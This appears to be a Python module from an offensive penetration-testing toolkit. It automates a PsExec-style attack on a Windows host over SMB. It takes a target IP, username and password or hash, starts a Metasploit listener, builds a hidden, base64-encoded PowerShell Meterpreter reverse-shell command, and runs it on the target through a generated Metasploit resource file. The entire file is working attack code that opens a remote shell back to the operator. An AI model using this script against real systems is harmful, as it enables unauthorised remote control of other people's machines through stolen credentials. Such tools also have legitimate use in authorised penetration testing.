#!/usr/bin/python
#

from src.core.main import *
from src.core.menus import *
from src.ps.psgen import *
from time import sleep
import os

while 1:
	try:
		clear()
		# select payload
		selection = 0
		while selection != range(1,2):
			clear()
			psexec_menu()
			selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1':
				payload = "windows/meterpreter/reverse_tcp"
				break
			if selection == '2' or not selection:
				payload = "windows/meterpreter/reverse_http"
				break

		ip, port = connectInfo("r")

		# target info
		rhost = raw_input(" Enter target IP: ")
		username = raw_input(" Enter username: ")
		password = raw_input(" Enter password or hash: ")
		
		# spawn listener
		if os.path.exists("/usr/bin/xterm"):
			PrintInfo("Starting listener")
			subp.Popen("xterm -e msfcli exploit/multi/handler PAYLOAD=%s LHOST=%s LPORT=%s E" \
					% (payload, ip, port), shell=True, stdout=open("/dev/null","w"))
		else:
			PrintError("Xterm not installed. Start listener manually or install xterm")
			PrintInfo("Choose N if you started the listener manually")
			exitmodule = raw_input("\n Exit module? (Y/N): ")
			if exitmodule == "Y" or exitmodule == "y":
				break
		
		# sleep for 5 seconds for listener to startup on slower systems
		PrintInfo("Sleeping for 5 seconds")
		sleep(5)

		# build encoded ps command
		PrintInfo("Generating encrypted powershell command")
		psCommand = generatePS("windows/meterpreter/reverse_tcp", ip, port)
		psCommand = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + psCommand
		
		# build rc file
		fw = open("output/msf.rc", "w")
		fw.write("use auxiliary/admin/smb/psexec_command\n")
		fw.write("set RHOSTS %s\n" % rhost)
		fw.write("set SMBUser %s\n" % username)
		fw.write("set SMBPass %s\n" % password)
		fw.write("set COMMAND %s\n" % psCommand)
		fw.write("exploit\n")
		fw.write("sleep 3\n")
		fw.write("exit\n")
		fw.close()

		# launch psexec
		PrintInfo("Injecting powershell with MSF, please wait")
		subp.Popen("msfconsole -n -L -r output/msf.rc", shell=True, stdout=open("/dev/null","w")).wait()

		# Return to main
		PrintInfo("Completed")
		EntContinue()
		break
	except KeyboardInterrupt:
		break

